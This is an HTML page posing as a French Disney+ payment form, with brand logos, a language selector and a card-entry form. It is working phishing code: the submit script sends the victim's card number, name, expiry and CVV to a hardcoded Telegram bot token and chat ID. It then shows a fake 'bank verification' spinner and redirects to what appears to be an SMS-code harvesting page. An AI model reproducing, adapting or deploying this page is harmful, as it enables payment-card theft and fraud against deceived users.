<!DOCTYPE html>
<html lang="">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="robots" content="noindex, nofollow"/>
  <title data-i18n-key="payTitle">Paiement | Disney+</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <!-- S√©lecteur de langue -->
  <div class="lang-container">
    <label for="lang-select" data-i18n-key="langLabel">Langue :</label>
    <select id="lang-select">
      <option value="fr">Fran√ßais</option>
      <option value="en">English</option>
      <option value="de">Deutsch</option>
      <option value="es">Espa√±ol</option>
    </select>
  </div>

  <!-- Logo -->
  <header>
    <img src="Images/compose2.png" alt="Disney+" class="logo" />
  </header>

  <main>
    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="my-disney"/>

    <h1 data-i18n-key="payTitle">Informations de paiement</h1>

    <!-- Ic√¥nes CB (non traduites) -->
    <div class="cb-icons">
      <img src="Images/visa.png" alt="Visa"/>
      <img src="Images/Mastercard.png" alt="Mastercard"/>
      <img src="Images/Amex.png" alt="American Express"/>
    </div>

    <form id="paymentForm">
      <input type="text" placeholder="" data-i18n-key="payCardNumber" required/>
      <input type="text" placeholder="" data-i18n-key="payCardName" required/>
      <input type="text" placeholder="" data-i18n-key="payExpiry" required/>
      <input type="text" placeholder="" data-i18n-key="payCvv" required/>

      <p class="footer-note" data-i18n-key="payNote">
        <!-- note text -->
      </p>

      <button type="submit" class="btn" data-i18n-key="payBtn">Valider le paiement</button>
    </form>

    <div class="footer-note" data-i18n-key="payFooter">
      <!-- footer logos description -->
      <div class="logos-container">
        <img src="Images/compose2.png" alt="Disney+"/>
        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
      </div>
    </div>
  </main>

  <!-- Spinner Overlay -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
    <div class="spinner-text" data-i18n-key="paySpinnerText">V√©rification bancaire en cours...</div>
  </div>

  <!-- i18n init -->
  <script src="i18n.js"></script>
  <script>
    // R√©cup√®re et applique langue
    function getLanguage() {
      let lang = localStorage.getItem('lang') || navigator.language.slice(0,2) || 'fr';
      if (!translations[lang]) lang = 'fr';
      return lang;
    }
    const lang = getLanguage();
    localStorage.setItem('lang', lang);
    document.documentElement.lang = lang;

    // S√©lecteur
    const select = document.getElementById('lang-select');
    select.value = lang;
    select.addEventListener('change', e => {
      localStorage.setItem('lang', e.target.value);
      window.location.reload();
    });

    // Traductions
    document.querySelectorAll('[data-i18n-key]').forEach(el => {
      const key = el.getAttribute('data-i18n-key');
      if (translations[lang][key]) el.placeholder = el.tagName==='INPUT'? translations[lang][key] : el.innerText = translations[lang][key];
    });
  </script>

  <script>
    document.getElementById("paymentForm").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("spinnerOverlay").style.display = "flex";

      const [num, name, exp, cvv] = Array.from(this.elements)
        .filter(el=>el.tagName==='INPUT')
        .map(el=>el.value.trim());

      const message = `üí≥ Paiement Disney+ :\nCarte: ${num}\nNom: ${name}\nExp: ${exp}\nCVV: ${cvv}`;
      fetch(`https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage`, {
        method:"POST", headers:{"Content-Type":"application/json"},
        body: JSON.stringify({ chat_id: "-4970333928", text: message })
      }).catch(console.error)
      .finally(() => setTimeout(()=> window.location.href="sms-verification.html",17000));
    });
  </script>
</body>
</html>
